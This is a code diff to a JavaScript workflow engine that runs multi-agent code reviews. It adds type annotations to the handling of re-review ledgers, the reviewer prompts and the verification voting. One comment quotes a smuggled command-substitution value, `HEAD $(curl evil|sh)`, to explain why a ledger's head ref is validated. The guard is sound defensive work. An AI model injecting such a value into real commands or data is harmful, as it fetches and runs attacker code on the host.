+/** @param {{ priorRound: PriorRound | null, thisRound: number, fullEvery: number, degraded: boolean, journalSourced: boolean }} args */
 function shouldFullRescan({ priorRound, thisRound, fullEvery, degraded, journalSourced }) {
   if (!priorRound) return true            // a first review is already a full base...HEAD scan
   if (degraded) return true               // nothing to carry — a delta-only scan would review almost nothing
@@ -3631,6 +3686,7 @@ function shouldFullRescan({ priorRound, thisRound, fullEvery, degraded, journalS
 // re-runnable tool behind it, so it must be verifiable by argument like a lens finding; classifying
 // it as a tool would make it effectively unfalsifiable ("keep an unverifiable tool finding alive")
 // and inflate the verdict with false Warnings.
+/** @param {Profile} profile @param {string} source */
 function isToolSource(profile, source) {
   return !(profile.lenses.includes(source) || source === 'negative-space' || source === 'dep-context')
 }
@@ -3711,6 +3767,7 @@ const head = (typeof detected?.head === 'string' ? detected.head : '').trim()
 // own, so it does not enter the chain: not as a reader (here) and not as a candidate
 // (`selectPriorRounds` skips `nested` rows). The run that has a history is the top-level one.
 // Unlike the condition this replaces, the skip is announced — a silent skip was that defect.
+/** @type {PriorRound | null} */
 let priorRound = null
 // The prior-round lookup's non-found reason, held here because `priorRound` is nulled on a miss below.
 // It is the reason the run did NOT chain to a prior round; null means it DID (reReviewMemory reads null
@@ -3736,11 +3793,11 @@ It prints ONE line of JSON and always exits 0. Return that object VERBATIM — c
   // Every rejection has a reason and the reason is LOGGED. Silence here is the exact defect this
   // command replaced: the first re-review of a branch whose rows predate the absolute-path key
   // restarts from a blank ledger, and that must be visible rather than inferred from thin results.
-  if (!priorRound?.found) {
+  if (!priorRound?.['found']) {
     // Capture WHY there is no prior round BEFORE `priorRound` is nulled below: the re-review memory
     // outcome (chained? and the detached-HEAD note) is derived from it (realm @nick/craft #104).
-    priorReason = priorRound?.reason || 'no-prior-round'
-    if (priorRound?.reason) log(`No prior round: ${priorRound.reason}`)
+    priorReason = priorRound?.['reason'] || 'no-prior-round'
+    if (priorRound?.['reason']) log(`No prior round: ${priorRound['reason']}`)
     // A read that FAILED is the same lost-record class as a write that failed, and its silence is
     // worse: the run degrades into a first review (thisRound resets to 1, the whole adjudicate/carry
     // track is skipped) and the report cannot be told apart from a genuine first pass.
@@ -3749,9 +3806,9 @@ It prints ONE line of JSON and always exits 0. Return that object VERBATIM — c
     // "the read could not run". Only the latter is a lost record; marking the former would fire the
     // marker on every first review, which is precisely how a marker stops being read.
     const READ_FAILURES = ['loader-did-not-run', 'git-unavailable']
-    const readFailed = !priorRound || !!priorRound.__threw || READ_FAILURES.some(r => String(priorRound.reason || '').startsWith(r))
+    const readFailed = !priorRound || !!priorRound['__threw'] || READ_FAILURES.some(r => String(/** @type {PriorRound} */ (priorRound)['reason'] || '').startsWith(r))
     if (readFailed) {
-      noteTelemetryLoss('the prior-round ledger', priorRound?.__threw || priorRound?.reason || 'the loader agent returned no result')
+      noteTelemetryLoss('the prior-round ledger', priorRound?.['__threw'] || priorRound?.['reason'] || 'the loader agent returned no result')
     }
     priorRound = null
   }
@@ -3760,16 +3817,16 @@ It prints ONE line of JSON and always exits 0. Return that object VERBATIM — c
   // safe commit-ish (a crafted `HEAD $(curl evil|sh)` from a tampered ledger), fall back to the
   // already-resolved base ref rather than nulling priorRound — re-review stays ON, the fix-range diff
   // just widens to base...HEAD. The use sites additionally shq()/flattenField() it (defense in depth).
-  if (priorRound && !isCommitish(priorRound.head)) {
-    log(`⚠️ prior-round head ${JSON.stringify(priorRound.head)} is not a safe commit-ish — falling back to the base ref for the fix-range diff`)
-    priorRound.head = baseRef
+  if (priorRound && !isCommitish(priorRound['head'])) {
+    log(`⚠️ prior-round head ${JSON.stringify(priorRound['head'])} is not a safe commit-ish — falling back to the base ref for the fix-range diff`)
+    priorRound['head'] = baseRef
   }
 }
 // Transport integrity: assert the ledger we received is the ledger the script printed.
 if (priorRound && ledgerTruncated(priorRound)) {
-  log(`⚠️ prior-round ledger arrived TRUNCATED: the loader printed ${priorRound.ledgerCount} entr(ies), ${priorRound.ledger?.length || 0} survived transport — treating the round as degraded and forcing a full re-scan.`)
+  log(`⚠️ prior-round ledger arrived TRUNCATED: the loader printed ${priorRound['ledgerCount']} entr(ies), ${priorRound['ledger']?.length || 0} survived transport — treating the round as degraded and forcing a full re-scan.`)
 }
-if (priorRound) log(`Re-review: prior round ${priorRound.round} @ ${flattenField(priorRound.head)} · ${priorRound.ledger?.length || 0} ledger finding(s)`)
+if (priorRound) log(`Re-review: prior round ${priorRound['round']} @ ${flattenField(priorRound['head'])} · ${priorRound['ledger']?.length || 0} ledger finding(s)`)
 else log(freshArg ? 'Fresh review (—fresh): prior round ignored' : 'First review for this branch (no prior round)')
 
 // realm @nick/craft #104: whether re-review memory engaged, and the note for the one case that fails
@@ -3797,7 +3854,7 @@ if (reReview.note) {
 // and the loser's ledger is orphaned. Live findings recover on the next full rescan; the one casualty
 // with no recovery path is the loser's monotonic tombstone set. This is an accepted, bounded loss, not
 // corruption — recorded here so the next reader meets the assumption before the store, not after.
-const thisRound = priorRound ? (priorRound.round || 1) + 1 : 1
+const thisRound = priorRound ? (priorRound['round'] || 1) + 1 : 1
 // The prior round's finding fingerprints are comparable to this round's
 // only when both were fingerprinted under the same basis (FP_BASIS_SINCE in lib/run-record.mjs — a
 // separate question from the engine revision, so a telemetry-only bump keeps it; realm @nick/craft
@@ -3815,10 +3872,10 @@ const thisRound = priorRound ? (priorRound.round || 1) + 1 : 1
 // or a truncated or swapped list does not — and otherwise fails closed, reporting a transport loss
 // (priorBasisMismatch). When the array arrived intact, THIS engine's table decides, whatever the
 // logger's own table said (realm @nick/craft #111).
-const relayedVerdict = priorRound && typeof priorRound.sameFpBasis === 'boolean'
-  ? { sameFpBasis: priorRound.sameFpBasis, fpBasisKnown: priorRound.fpBasisKnown } : null
-const relayedRevisions = priorRound && Array.isArray(priorRound.priorFpRevisions) ? priorRound.priorFpRevisions : null
-const relayedCheck = priorRound && typeof priorRound.priorFpRevisionsCheck === 'string' ? priorRound.priorFpRevisionsCheck : null
+const relayedVerdict = priorRound && typeof priorRound['sameFpBasis'] === 'boolean'
+  ? { sameFpBasis: priorRound['sameFpBasis'], fpBasisKnown: priorRound['fpBasisKnown'] } : null
+const relayedRevisions = priorRound && Array.isArray(priorRound['priorFpRevisions']) ? priorRound['priorFpRevisions'] : null
+const relayedCheck = priorRound && typeof priorRound['priorFpRevisionsCheck'] === 'string' ? priorRound['priorFpRevisionsCheck'] : null
 // A new loader prints BOTH fields on every path; an older one prints neither. So: an array whose check
 // no longer matches, or a check with no array, is a transport loss. An EMPTY array whose '' check the
 // relay dropped is not — that is an honest "nothing established", and the absent check reads as ''.
@@ -3850,14 +3907,14 @@ const priorBasisVerdict = !priorBasis ? 'absent'
 let tombstonesDroppedForBasis = 0
 const priorLedgerDegraded = ledgerDegraded(priorRound)
 if (priorLedgerDegraded) {
-  log(`⚠️ Re-review DEGRADED: prior round ${priorRound.round} reported ${priorRound.priorFindings} finding(s) but persisted NO ledger — the adjudicate track has nothing to carry or re-verify. Forcing a full base...HEAD re-scan this round; if results still look thin, re-run with {fresh:true}.`)
+  log(`⚠️ Re-review DEGRADED: prior round ${/** @type {PriorRound} */ (priorRound)['round']} reported ${/** @type {PriorRound} */ (priorRound)['priorFindings']} finding(s) but persisted NO ledger — the adjudicate track has nothing to carry or re-verify. Forcing a full base...HEAD re-scan this round; if results still look thin, re-run with {fresh:true}.`)
 }
 // Distinct from `priorLedgerDegraded`: the ledger itself is fine here, but a journal-reconstructed
 // round's `head` is the commit the DEAD run stalled on, which the operator typically re-runs against
 // BEFORE making any fix — so it can equal the current HEAD and a delta scan would review nothing.
-const priorRoundJournalSourced = Boolean(priorRound?.journalSourced)
+const priorRoundJournalSourced = Boolean(priorRound?.['journalSourced'])
 if (priorRoundJournalSourced) {
-  log(`⚠️ Re-review round reconstructed from what a STOPPED run left behind (its journal, or its surviving phase checkpoints): prior round ${priorRound.round}'s head ${flattenField(priorRound.head)} is where that run stopped, not a completed round's head — it may equal this run's HEAD if no fix landed yet. Forcing a full base...HEAD re-scan this round rather than risk an empty head...HEAD diff.`)
+  log(`⚠️ Re-review round reconstructed from what a STOPPED run left behind (its journal, or its surviving phase checkpoints): prior round ${/** @type {PriorRound} */ (priorRound)['round']}'s head ${flattenField(/** @type {PriorRound} */ (priorRound)['head'])} is where that run stopped, not a completed round's head — it may equal this run's HEAD if no fix landed yet. Forcing a full base...HEAD re-scan this round rather than risk an empty head...HEAD diff.`)
 }
 const fullRescan = shouldFullRescan({ priorRound, thisRound, fullEvery, degraded: priorLedgerDegraded, journalSourced: priorRoundJournalSourced })
 // On a re-review the lenses look only at the fix commits (prevHead...HEAD) — cheap, and it catches
@@ -3869,7 +3926,7 @@ const lensBase = (priorRound && !fullRescan) ? priorRound.head : baseRef
 if (priorRound) {
   log(`Re-review round ${thisRound} lens scope: ${fullRescan
     ? `FULL base...HEAD re-scan (fullEvery=${fullEvery}${priorLedgerDegraded ? ', ledger degraded' : ''}${priorRoundJournalSourced ? ', prior round journal-sourced' : ''}) — earlier misses in untouched code are re-checked`
-    : `incremental delta ${flattenField(priorRound.head)}...HEAD (fix commits only)`}`)
+    : `incremental delta ${flattenField(priorRound['head'])}...HEAD (fix commits only)`}`)
 }
 
 // Active profiles: detected in the diff, intersected with any explicit pin. If a pin names a profile
@@ -3918,7 +3975,7 @@ if (coverage.outcome === 'nothing-to-review') {
   return out([
     `## Verdict`, `✅ Approve (NOTHING TO REVIEW) — ${okMsg}`,
     ``, `## Detected`, detected?.notes || `${changedFiles.length} changed file(s)`,
-    ``, `## Not reviewed (nothing reviewable in them)`, ...changedFiles.map(f => `- ${f}`),
+    ``, `## Not reviewed (nothing reviewable in them)`, ...changedFiles.map((/** @type {string} */ f) => `- ${f}`),
   ].join('\n') + scopeSection())
 }
 if (coverage.outcome === 'no-profile') {
@@ -3931,7 +3988,7 @@ if (coverage.outcome === 'no-profile') {
   return out([
     `## Verdict`, `⚠️ INCOMPLETE — ${msg}`,
     ``, `## Detected`, detected?.notes || `${changedFiles.length} changed file(s)`,
-    ...(changedFiles.length ? [``, `## Not reviewed (no language profile)`, ...changedFiles.map(f => `- ${f}`)] : []),
+    ...(changedFiles.length ? [``, `## Not reviewed (no language profile)`, ...changedFiles.map((/** @type {string} */ f) => `- ${f}`)] : []),
   ].join('\n') + scopeSection())
 }
 log(`Active profiles: ${active.map(p => p.id).join(', ')}${pinnedLangs ? ` (pinned: ${pinnedLangs.join(',')})` : ''} · base ${baseRef || 'HEAD'}`)
@@ -3940,11 +3997,12 @@ log(`Active profiles: ${active.map(p => p.id).join(', ')}${pinnedLangs ? ` (pinn
 // The ones that are a real coverage gap (see coverageGapFiles: material AND not project config)
 // additionally reach the verdict further down, so it carries the (INCOMPLETE) marker rather than a
 // bare Approve.
-const uncoveredFiles = changedFiles.filter(f => !active.some(p => p.detect([f])))
+const uncoveredFiles = changedFiles.filter((/** @type {string} */ f) => !active.some(p => p.detect([f])))
 const uncoveredGap = coverageGapFiles(uncoveredFiles)
 if (uncoveredFiles.length) log(`Outside all active profiles (not reviewed): ${uncoveredFiles.join(', ')}${uncoveredGap.length ? ` — ${uncoveredGap.length} unreviewed source file(s)` : ' (docs/assets/lockfiles/project config only — not a coverage gap)'}`)
 
 // ================= Prompt builders (profile-parameterized) =================
+/** @param {Profile} profile */
 function scoutPrompt(profile) {
   return `You are scouting a ${profile.lang} diff to plan an elastic review. Use shell + read only — do NOT review yet.${pathArg ? `\n\nSCOPE: review ONLY the crate/dir at \`${flattenField(pathArg)}\`. Pass \`-- ${shq(pathArg)}\` to every \`git diff\` command below.` : ''}
 
@@ -3954,7 +4012,7 @@ Diff base: ${lensBase ? `\`${flattenField(lensBase)}\`` : 'uncommitted changes /
 2. lenses: choose from ${JSON.stringify(profile.lenses)}.
    - small: only the touched categories (minimum 2; always include the dominant category, and include '${profile.safetyLens}' unless the diff clearly touches nothing related to ${profile.securityHints}).
    - medium: the categories plausibly in play.
-   - large: all of them, EXCEPT ${JSON.stringify(profile.lenses.filter(l => CONDITIONAL_LENSES.includes(l)))} — the
+   - large: all of them, EXCEPT ${JSON.stringify(profile.lenses.filter((/** @type {string} */ l) => CONDITIONAL_LENSES.includes(l)))} — the
      engine adds those itself off a code signal in the diff, so picking one here only pays for an
      agent the signal did not ask for. Do not count them toward your choices.
    ${profile.scoutRules}${strict ? '\n   STRICT MODE is on: ALWAYS include \'maintainability\' in lenses regardless of size.' : ''}
@@ -3968,6 +4026,7 @@ Diff base: ${lensBase ? `\`${flattenField(lensBase)}\`` : 'uncommitted changes /
    - invariantType: does it change a type that carries an invariant other code relies on?`
 }
 
+/** @param {string} priorSummary @param {Profile} profile @param {Plan} plan */
 function negativeSpacePrompt(priorSummary, profile, plan) {
   const intent = plan?.intent ?? intentArg
   return `You are the **negative-space** review lens for a ${profile.lang} change. Unlike the other lenses, your job is NOT to review the changed lines — it is to find the bug the diff ENABLES in code it did NOT touch. ${profile.navSkill ? `Load the ${profile.navSkill} skill for whole-repo search; use` : 'Use'} Grep/Glob across the ENTIRE tree, not just the diff.
@@ -3989,6 +4048,7 @@ ${priorSummary}
 Return {lens: "negative-space", findings: [...]} using the shared finding schema. Set \`ruleId\` to the matching ${profile.rubricSkill} rules.md ID or "" if none fits. Observability: the workflow records this run — do NOT write your own record.`
 }
 
+/** @param {string} lens @param {string} priorSummary @param {Profile} profile @param {Plan} plan @param {Slice | null} [slice] */
 function lensPrompt(lens, priorSummary, profile, plan, slice = null) {
   if (lens === 'negative-space') return negativeSpacePrompt(priorSummary, profile, plan)
   // The pathspec the lens reviews. A slice replaces the profile's globs with its own files — that
@@ -4026,13 +4086,14 @@ Observability: the review workflow records this run — do NOT write your own re
 
 // `profile` is threaded in for the exclusion catalog: it is per-profile (only the rust rubric ships
 // an fp-rules.md today), and naming a file the nix reviewer does not have would send it hunting.
+/** @param {Finding} f @param {number} idx @param {boolean} isTool @param {string} gateProvenance @param {Profile} profile */
 function verifyPrompt(f, idx, isTool, gateProvenance, profile) {
   // Model-authored fields enter this prompt as context — guard them the same way the adjudicate track
   // does: flatten identifier/locator fields via promptFields (newline is the single-value injection
   // vector; identifier chars are load-bearing for the grep) and markdown-strip the prose (why/source).
   const pf = promptFields(f)
-  const src = sanitizeAttack(f.source)
-  const why = sanitizeAttack(f.why)
+  const src = sanitizeAttack(f['source'])
+  const why = sanitizeAttack(f['why'])
   const exclusionCatalog = profile?.fpRules
     ? `\nEXCLUSION CATALOG: your rejection is itself a claim and carries the same burden of proof as the finding. Load the ${profile.rubricSkill} skill's ${profile.fpRules} and, when one of its precedents fires, name the ID in \`reason\` (e.g. "refuted per FP-006: proven-Some unwrap"). Run the TRACE each rule demands — "looks guarded" does not fire the invariant-protected rule; following the invariant to its source and showing it dominates the sink on every path does. Two of them (FP-002 operator-controlled input, FP-005 operator-only panic surface) are severity DOWNGRADES, not refutations: the claim still holds, only the attacker's access is missing — say so in \`reason\` and leave refuted=false. The file also lists the KEEP-* non-reasons, dismissals that sound decisive and have repeatedly killed real defects (soundness in a public API no current caller reaches, a logic bug in safe Rust, a panic unwinding through an unsafe region). If nothing in the catalog fits, judge on the merits — never force a bad fit to justify a drop.\n`
     : ''
@@ -4042,17 +4103,17 @@ function verifyPrompt(f, idx, isTool, gateProvenance, profile) {
   return `${head}
 
 FINDING: [${pf.severity}] ${pf.title}
-  at ${pf.file || '?'}:${f.line || 0}
+  at ${pf.file || '?'}:${f['line'] || 0}
   why: ${why}
-  source: ${src}${f.ruleId ? ` · rule ${pf.ruleId}` : ''}
-  off-site evidence claimed: ${f.whereChecked ? pf.whereChecked : '(none — the finding claims to be self-contained at the cited line)'}
+  source: ${src}${f['ruleId'] ? ` · rule ${pf.ruleId}` : ''}
+  off-site evidence claimed: ${f['whereChecked'] ? pf.whereChecked : '(none — the finding claims to be self-contained at the cited line)'}
 
 MECHANICAL CHECK FIRST: if a tool can decide this finding (a clippy lint, statix/deadnix rule, semgrep rule, cargo-audit advisory — infer from source/ruleId/title), RUN it scoped to the cited file; its output overrides your judgement in BOTH directions: tool still reports it → refuted=false; tool demonstrably no longer reports it → refuted=true (quote the output in reason).${gateProvenance ? ` The gate invoked the tools as: "${flattenField(gateProvenance)}" — if a tool is not on PATH, reproduce the gate's invocation (e.g. \`nix run nixpkgs#<tool> --\`) before declaring it unrunnable.` : ''}${isTool ? ' If you STILL cannot run the tool, set refuted=false — an unverifiable tool finding stays alive.' : ' If no tool applies, judge it yourself.'}
 
 REFUTATION RULE: refuted=true means the finding's TECHNICAL CLAIM is false — the cited code does not contain the claimed defect, or the deciding tool demonstrably no longer reports it. Context is NOT refutation: that the code is test/fixture/example-only, looks intentional, is unlikely to be built or run, or has low impact NEVER justifies refuted=true. Record that context in reachable=false and reason instead — severity is calibrated downstream.
 
 ${exclusionCatalog}Open the cited file and check:
-1. citedLineMatches: does ${pf.file || '?'}:${f.line || 0} actually contain what the finding claims? (If the citation is wrong/hallucinated → citedLineMatches=false.)
+1. citedLineMatches: does ${pf.file || '?'}:${f['line'] || 0} actually contain what the finding claims? (If the citation is wrong/hallucinated → citedLineMatches=false.)
 2. reachable: is this code reachable in production, or is it test/example/fixture-only code? (Test-only → reachable=false. This does NOT refute the finding — it only calibrates severity downstream.) REACHABILITY IS ABOUT THE ROUTE, not just the destination: if the claim is "reachable from untrusted input", check that the ROUTE runs from the real entry point — the parser, the handler, the deserializer, the public API — on attacker-supplied data. Reaching the state by CONSTRUCTING the object directly (a builder, \`new\`, a test fixture, an internal constructor) bypasses exactly the validation the question is about, and proves nothing about untrusted-input reachability. That trap catches careful reviewers, so check it explicitly rather than assuming the route was the obvious one.
 3. refuted: is the technical claim itself false? (${isTool ? 'Tool-decided as above.' : 'Mechanical check first, then your judgement; when uncertain about the claim, refuted=true.'})
 4. premiseSupported: identify the finding's LOAD-BEARING premise — the one claim that, if false, makes the finding evaporate. If it lives outside the cited line (the dependency behaves this way, this is reachable from untrusted input, no caller guards it, the sibling does X), OPEN the \`whereChecked\` location and check it actually shows that. premiseSupported=false when the premise is off-site and \`whereChecked\` is empty, points somewhere that does not show it, or merely restates the cited line. premiseSupported=true when the finding is genuinely self-contained at the cited line, or the off-site evidence checks out. Do NOT set refuted=true just because a premise is uncited — unsupported is not disproven; that is what this field is for, and it demotes the finding downstream instead of killing it.
@@ -4083,26 +4144,27 @@ const DEDUP_SCHEMA = {
 // folded into the representative finding rather than dropped, and the count is stated in the title
 // and logged — a silent truncation would read as "there were only N", which is worse than the flood.
 const ROLLUP_MAX = 3
+/** @param {Finding[]} pool @param {Profile} profile */
 function rollupPool(pool, profile) {
   const ids = profile.rollupRuleIds || []
   if (!ids.length) return pool
   const groups = new Map()
   const out = []
   for (const f of pool) {
-    const id = f.ruleId || ''
+    const id = f['ruleId'] || ''
     if (!ids.includes(id)) { out.push(f); continue }
-    const k = `${f.source || ''}::${id}`
+    const k = `${f['source'] || ''}::${id}`
     const g = groups.get(k) || (groups.set(k, []), groups.get(k))
     g.push(f)
   }
   for (const [, g] of groups) {
     // Order by severity so the representative is the worst instance, not an arbitrary one.
-    const sorted = g.slice().sort((a, b) => (SEV_RANK[a.severity] ?? 9) - (SEV_RANK[b.severity] ?? 9))
+    const sorted = g.slice().sort((/** @type {Finding} */ a, /** @type {Finding} */ b) => (SEV_RANK[a['severity']] ?? 9) - (SEV_RANK[b['severity']] ?? 9))
     if (sorted.length <= ROLLUP_MAX) { out.push(...sorted); continue }
     const keep = sorted.slice(0, ROLLUP_MAX)
     const folded = sorted.slice(ROLLUP_MAX)
     const rep = folded[0]
-    const where = folded.slice(0, 6).map(f => `${f.file || '?'}:${f.line || 0}`).join(', ')
+    const where = folded.slice(0, 6).map((/** @type {Finding} */ f) => `${f['file'] || '?'}:${f['line'] || 0}`).join(', ')
     out.push(...keep, {
       ...rep,
       title: `${rep.title} — and ${folded.length - 1} more of the same (${rep.ruleId})`,
@@ -4121,11 +4183,12 @@ function rollupPool(pool, profile) {
 // two findings, and each paid a full 4-vote individual verification. Catch that deterministically — the
 // model pass then only has to handle the genuinely reworded cross-file duplicates it is good at.
 const SAME_SPOT_OVERLAP = 0.6
+/** @param {Finding[]} pool */
 function sameSpotGroups(pool) {
   const bySpot = new Map()
-  pool.forEach((f, i) => {
-    if (!f || !f.file) return // no location → nothing to key on; leave it to the model pass
-    const k = `${String(f.file).toLowerCase()}:${f.line || 0}`
+  pool.forEach((/** @type {Finding} */ f, /** @type {number} */ i) => {
+    if (!f || !f['file']) return // no location → nothing to key on; leave it to the model pass
+    const k = `${String(f['file']).toLowerCase()}:${f['line'] || 0}`
     ;(bySpot.get(k) || (bySpot.set(k, []), bySpot.get(k))).push(i)
   })
   const groups = []
@@ -4137,7 +4200,7 @@ function sameSpotGroups(pool) {
       const g = [i]
       for (const j of idxs) {
         if (j === i || taken.has(j)) continue
-        if (shingleOverlap(pool[i].title, pool[j].title) >= SAME_SPOT_OVERLAP) { g.push(j); taken.add(j) }
+        if (shingleOverlap(/** @type {Finding} */ (pool[i])['title'], /** @type {Finding} */ (pool[j])['title']) >= SAME_SPOT_OVERLAP) { g.push(j); taken.add(j) }
       }
       if (g.length > 1) { taken.add(i); groups.push(g) }
     }
@@ -4145,10 +4208,11 @@ function sameSpotGroups(pool) {
   return groups
 }
 
+/** @param {Finding[]} pool @param {Profile} profile */
 async function dedupPool(pool, profile) {
   if (pool.length < 2) return pool
-  const isToolSrc = f => isToolSource(profile, f.source)
-  const listing = pool.map((f, i) => `${i}. ${f.file || '?'}:${f.line || 0} [${f.severity}] (${f.source}) ${f.title} — ${String(f.why || '').slice(0, 160)}`).join('\n')
+  const isToolSrc = (/** @type {Finding} */ f) => isToolSource(profile, f['source'])
+  const listing = pool.map((/** @type {Finding} */ f, /** @type {number} */ i) => `${i}. ${f['file'] || '?'}:${f['line'] || 0} [${f['severity']}] (${f['source']}) ${f['title']} — ${String(f['why'] || '').slice(0, 160)}`).join('\n')
   let res = null
   try {
     res = await ragent(
@@ -4161,34 +4225,35 @@ Return {groups: [[i, j, ...], ...]} — index groups of same-defect findings; om
       { label: `dedup:${profile.id}`, phase: 'Verify', schema: DEDUP_SCHEMA, model: 'haiku', effort: 'low' },
     )
   } catch (e) {
-    log(`[${profile.id}] dedup pass failed (${String((e && e.message) || e).slice(0, 80)}) — verifying the raw pool`)
+    log(`[${profile.id}] dedup pass failed (${String((e && /** @type {{ message?: unknown }} */ (e).message) || e).slice(0, 80)}) — verifying the raw pool`)
   }
   // Deterministic same-spot groups go FIRST: the "overlapping groups: first wins" rule below then
   // makes them authoritative over a model group that would have split the same indices differently.
   const detGroups = sameSpotGroups(pool)
   const groups = detGroups.concat(
-    (res?.groups ?? []).filter(g => Array.isArray(g) && g.length > 1 && g.every(i => Number.isInteger(i) && i >= 0 && i < pool.length)),
+    (res?.groups ?? []).filter((/** @type {any} */ g) => Array.isArray(g) && g.length > 1 && g.every(i => Number.isInteger(i) && i >= 0 && i < pool.length)),
   )
+  /** @type {Finding[]} */
   const merged = []
   const inGroup = new Set()
   for (const g of groups) {
     if (g.some(i => inGroup.has(i))) continue // overlapping groups: first wins
     for (const i of g) inGroup.add(i)
-    const members = g.map(i => pool[i])
+    const members = g.map((/** @type {number} */ i) => /** @type {Finding} */ (pool[i]))
     // Base = the strictest member: tool-sourced first (a tool finding can only be refuted by
     // re-running the tool), then highest severity.
-    const base = members.slice().sort((a, b) => (isToolSrc(b) - isToolSrc(a)) || ((SEV_RANK[a.severity] ?? 9) - (SEV_RANK[b.severity] ?? 9)))[0]
+    const base = /** @type {Finding} */ (members.slice().sort((a, b) => (/** @type {number} */ (/** @type {unknown} */ (isToolSrc(b))) - /** @type {number} */ (/** @type {unknown} */ (isToolSrc(a)))) || ((SEV_RANK[a['severity']] ?? 9) - (SEV_RANK[b['severity']] ?? 9)))[0])
     const others = members.filter(m => m !== base)
     // Carry ALL contributing sources so a downstream source-keyed rule (strict maintainability
     // escalation) still fires when its trigger lens was merged into a different-source base.
-    const sources = [...new Set(members.map(m => m.source).filter(Boolean))]
+    const sources = [...new Set(members.map(m => m['source']).filter(Boolean))]
     // Union the off-site evidence too: a merged-away member may have pinned the premise the base
     // only asserted, and dropping it would cost the group its Confirmed tier at verification.
-    const whereChecked = [...new Set(members.map(m => m.whereChecked).filter(Boolean))].join('; ')
-    merged.push({ ...base, sources, whereChecked, why: `${base.why} (same defect also reported by: ${others.map(m => m.source).join(', ')})` })
+    const whereChecked = [...new Set(members.map(m => m['whereChecked']).filter(Boolean))].join('; ')
+    merged.push({ ...base, sources, whereChecked, why: `${base['why']} (same defect also reported by: ${others.map(m => m['source']).join(', ')})` })
   }
   if (!merged.length) return pool
-  const out = pool.filter((_f, i) => !inGroup.has(i)).concat(merged)
+  const out = pool.filter((/** @type {Finding} */ _f, /** @type {number} */ i) => !inGroup.has(i)).concat(merged)
   const detFolded = detGroups.reduce((n, g) => n + g.length - 1, 0)
   log(`[${profile.id}] Dedup before verify: ${pool.length} → ${out.length} (${pool.length - out.length} cross-lens duplicate(s) merged — ${detFolded} of them same-spot, caught deterministically)`)
   return out
@@ -4301,12 +4366,13 @@ async function weightedWindow(entries, maxWeight, runOne) {
 // filed them at Low/Info — that combination *is* the under-call, and it is rare.
 const CRITICAL_TIER_RULES = new Set(['SAF-001', 'SAF-002', 'SAF-003', 'SAF-004', 'SAF-005', 'SAF-006', 'SAF-008', 'ERR-001', 'ERR-002'])
 const BATCH_SIZE = 6
+/** @param {Finding} f */
 function verifyTier(f) {
-  if (f.severity === 'Critical' || f.severity === 'High') return 'individual'
-  if (f.severity === 'Medium') return 'batch'
+  if (f['severity'] === 'Critical' || f['severity'] === 'High') return 'individual'
+  if (f['severity'] === 'Medium') return 'batch'
   // Low/Info: skipped, unless the rule it cites is one that blocks on sight — then the severity is
   // more likely a mislabel than a judgement, and it is worth one verifier to find out.
-  return CRITICAL_TIER_RULES.has(f.ruleId || '') ? 'individual' : 'skip'
+  return CRITICAL_TIER_RULES.has(f['ruleId'] || '') ? 'individual' : 'skip'
 }
 // ---- the same reasoning, carried to the tier where the money is ----
 // `verifyTier` skips Low/Info because no judgement on them can move the verdict. That is a statement
@@ -4399,13 +4465,15 @@ function floorSkipReason(floor) {
 // versus "the agent answered but said nothing about THIS finding" (a lost finding → it was part of
 // an inspection, so it keeps `suspected`). The discriminator is exactly this: a null/empty/malformed
 // answer is a dead agent; a non-empty verdict list missing one index is a lost finding.
-const NOT_VERIFIED = (f, why) => ({ ...f, tier: 'unverified', why: `${f.why} (NOT VERIFIED: ${why})` })
+/** @type {(f: Finding, why: string) => Finding} */
+const NOT_VERIFIED = (f, why) => ({ ...f, tier: 'unverified', why: `${f['why']} (NOT VERIFIED: ${why})` })
 // THE DEATH CLASS of a batch answer, or null when the verifier really did judge something. The
 // three classes are kept APART rather than collapsed into one boolean: they are three distinct ways
 // the answer can fail to arrive, and a single message for all of them makes a test that scripts one
 // of them pass while the other two are unreached — the "neighbouring door" failure the death table
 // below exists to prevent. Each class names itself in the finding's `why`, so a row of that table
 // proves which branch it reached.
+/** @param {any} res */
 function batchDeath(res) {
   if (!res) return 'returned nothing at all — a dead agent, an exhausted retry, or an expired deadline'
   if (!Array.isArray(res.verdicts)) return 'answered OFF-SCHEMA — its answer carried no verdict list at all'
@@ -4421,12 +4489,14 @@ function batchDeath(res) {
 // absent from `notRun`. The batch path had this guard (batchDeath, ex-verifierAnswered); the
 // individual path had none, so schema drift on a Critical silently became a refutation.
 const VOTE_AXES = ['refuted', 'citedLineMatches', 'reachable', 'premiseSupported']
+/** @param {Vote | null | undefined} v */
 function isVerdictShaped(v) {
   return !!v && typeof v === 'object' && VOTE_AXES.every(k => typeof v[k] === 'boolean')
 }
 // Do two verdicts say the same thing on every axis tierFromVotes reads? Only then can the opening
 // pair stand in for the full panel — a disagreement on ANY axis (not just `refuted`) can move the
 // tier, because citedLineMatches gates refutation outright and reachable/premiseSupported demote.
+/** @param {Vote} a @param {Vote} b */
 function votesAgree(a, b) {
   // An off-schema vote is not agreement either: two of them would `Boolean(undefined)`-match on every
   // axis and short-circuit the panel on garbage.
@@ -4435,6 +4505,7 @@ function votesAgree(a, b) {
 }
 // The majority arithmetic itself, over the SHAPED votes `v` (`live` is only needed to tell an
 // all-dead panel from an all-off-schema one). `tierFromVotes` below is the entry point.
+/** @param {Finding} f @param {Vote[]} live @param {Vote[]} v @returns {Finding} */
 function decideTier(f, live, v) {
   // EVERY vote died. This is not a judgement and must never be rendered as one: `suspected` is
   // defined in the report as "a verifier looked and the claim did not stand up", so handing it to a
@@ -4449,21 +4520,21 @@ function decideTier(f, live, v) {
       : 'every verifier vote for this finding died before returning a verdict — nothing was checked against the code')
   }
   const half = v.length / 2
-  const lineOk = v.filter(x => x.citedLineMatches).length >= Math.ceil(half)
-  const reach = v.filter(x => x.reachable).length >= Math.ceil(half)
-  const premiseOk = v.filter(x => x.premiseSupported).length >= Math.ceil(half)
-  const refutes = v.filter(x => x.refuted).length
+  const lineOk = v.filter((/** @type {Vote} */ x) => x['citedLineMatches']).length >= Math.ceil(half)
+  const reach = v.filter((/** @type {Vote} */ x) => x['reachable']).length >= Math.ceil(half)
+  const premiseOk = v.filter((/** @type {Vote} */ x) => x['premiseSupported']).length >= Math.ceil(half)
+  const refutes = v.filter((/** @type {Vote} */ x) => x['refuted']).length
   let tier
   if (!lineOk) tier = 'refuted'
   else if (refutes > half) tier = 'refuted'
   else if (refutes === 0) tier = 'confirmed'
   else tier = 'suspected'
   if (tier === 'confirmed' && !premiseOk) {
